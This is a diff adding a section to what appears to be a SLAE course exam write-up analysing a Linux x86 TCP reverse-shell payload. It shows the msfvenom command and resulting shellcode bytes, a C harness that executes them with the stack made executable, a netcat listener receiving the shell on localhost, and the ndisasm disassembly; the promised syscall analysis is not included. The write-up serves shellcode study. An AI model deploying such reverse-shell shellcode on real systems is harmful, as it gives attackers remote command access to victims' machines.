@@ -406,10 +406,111 @@ $ cat /usr/include/linux/net.h | grep sys_socket
 
 # Shellcode No.2 - TCP Reverse Shell
 
+At second glance, we'll take payload linux/x86/shell_reverse_tcp, very similar to the shellcode we wrote in the second SLAE exam task.
 
+------------------------------------------------------------------------------------------------------------------------
+Again, we'll use msfvenom for shellcode generation:
+```sh
+$ msfvenom -p linux/x86/shell_reverse_tcp LPORT=1234 LHOST=127.0.0.1 -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of c file: 311 bytes
+unsigned char buf[] =
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
+"\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+```
+------------------------------------------------------------------------------------------------------------------------
+shellcode.c wrapped updating:
+```c
+#include<stdio.h>
+#include<string.h>
 
+unsigned char code[] = \
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
+"\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
 
+main()
+{
 
+	printf("Shellcode Length:  %d\n", strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+```
+------------------------------------------------------------------------------------------------------------------------
+Compiling and executing:
+```sh
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+$ ./shellcode 
+Shellcode Length:  26
+```
+------------------------------------------------------------------------------------------------------------------------
+In the second terminal we can use netcat for setting up a listener:
+```sh
+$ nc -nvlp 1234
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 55473)
+id
+uid=1000(slae) gid=1000(slae) groups=1000(slae),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),107(lpadmin),124(sambashare)
+```
+
+Fantastic, everything works fine. As we see, again there are some null bytes, which breaks our "Shellcode Length" counter.
+
+------------------------------------------------------------------------------------------------------------------------
+Let's use ndisasm again.
+```sh
+$ echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" | ndisasm -u -
+```
+```nasm
+00000000  31DB              xor ebx,ebx
+00000002  F7E3              mul ebx
+00000004  53                push ebx
+00000005  43                inc ebx
+00000006  53                push ebx
+00000007  6A02              push byte +0x2
+00000009  89E1              mov ecx,esp
+0000000B  B066              mov al,0x66
+0000000D  CD80              int 0x80
+0000000F  93                xchg eax,ebx
+00000010  59                pop ecx
+00000011  B03F              mov al,0x3f
+00000013  CD80              int 0x80
+00000015  49                dec ecx
+00000016  79F9              jns 0x11
+00000018  687F000001        push dword 0x100007f
+0000001D  68020004D2        push dword 0xd2040002
+00000022  89E1              mov ecx,esp
+00000024  B066              mov al,0x66
+00000026  50                push eax
+00000027  51                push ecx
+00000028  53                push ebx
+00000029  B303              mov bl,0x3
+0000002B  89E1              mov ecx,esp
+0000002D  CD80              int 0x80
+0000002F  52                push edx
+00000030  686E2F7368        push dword 0x68732f6e
+00000035  682F2F6269        push dword 0x69622f2f
+0000003A  89E3              mov ebx,esp
+0000003C  52                push edx
+0000003D  53                push ebx
+0000003E  89E1              mov ecx,esp
+00000040  B00B              mov al,0xb
+00000042  CD80              int 0x80
+```
+------------------------------------------------------------------------------------------------------------------------
+
+The analysis of this shellcode will be divided into four parts, corresponding to the system calls called. 
 
 
 # Shellcode No.3 - Exec Command
